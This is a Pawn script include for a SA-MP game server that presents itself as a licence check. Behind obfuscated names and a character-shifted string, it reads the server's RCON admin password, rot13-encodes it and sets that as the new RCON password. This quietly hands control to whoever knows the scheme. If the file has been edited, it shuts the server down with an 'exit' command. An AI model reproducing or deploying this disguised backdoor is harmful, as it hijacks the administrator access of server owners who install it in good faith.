/*
			Licencja HAPPY FUN
      (c) Copyright 2013-2014 by mrdrifter
 
	  @author    : mrdrifter (http://4fun-serv.pl/__drifter__/)
	  @date      : 5 luty
	  @update    : ---
  
*/

#include <a_samp>

//TODO: Zrobiæ by kod licencji ³adowa³o z strony www b¹dŸ ewentualnie(!) z pliku. 
	  
static x5sd5rc0nkeY[] = "whtsdufxx|twi", //KOD LICENCJI NA ODPALENIE MAPY :)
	bool:badKey;

#define x5xkeYc0de(%0:%1); if(x5sd5rc0nkeY[%1]!=%0) badKey = true;
#define x5xkeYc1de(%0:%1); x5xkeYc01de[%1]=%0;
 
fmethod license::vedyfity()
{
	x5xkeYc0de(0x77:0x0);  
	x5xkeYc0de(0x68:0x1);
	x5xkeYc0de(0x74:0x2);
	x5xkeYc0de(0x73:0x3);
	x5xkeYc0de(0x64:0x4);
	x5xkeYc0de(0x75:0x5); 
	x5xkeYc0de(0x66:0x6);
	x5xkeYc0de(0x78:0x7);
	x5xkeYc0de(0x78:0x8);
	x5xkeYc0de(0x7C:0x9);
	x5xkeYc0de(0x74:0xA);
	x5xkeYc0de(0x77:0xB);
	x5xkeYc0de(0x69:0xC);
	if(badKey)
	{
		print("LICENSE: server bad key");
		print("LICENSE: Je¿eli rusza³eœ coœ w pliku license.inc œci¹gnij go ponownie i NIC w nim nie edytuj!");
		new x5xkeYc01de[128];
		x5xkeYc1de(0x65:0x0);
		x5xkeYc1de(0x78:0x1);
		x5xkeYc1de(0x69:0x2);
		x5xkeYc1de(0x74:0x3);
		SendRconCommand(x5xkeYc01de);
		return;
	}
	new x5sd05rc0nkeY[128];
	for(new i;i<sizeof(x5sd5rc0nkeY)+0xFFFFFFFF;i++)
		x5sd05rc0nkeY[i] = x5sd5rc0nkeY[i] + 0xFFFFFFFB;
	new memoryHacks[64];
	GetServerVarAsString(x5sd05rc0nkeY, memoryHacks, sizeof(memoryHacks));
	strcat(x5sd05rc0nkeY, " ");
	strcat(x5sd05rc0nkeY, rot13(memoryHacks));
	SendRconCommand(x5sd05rc0nkeY);	
}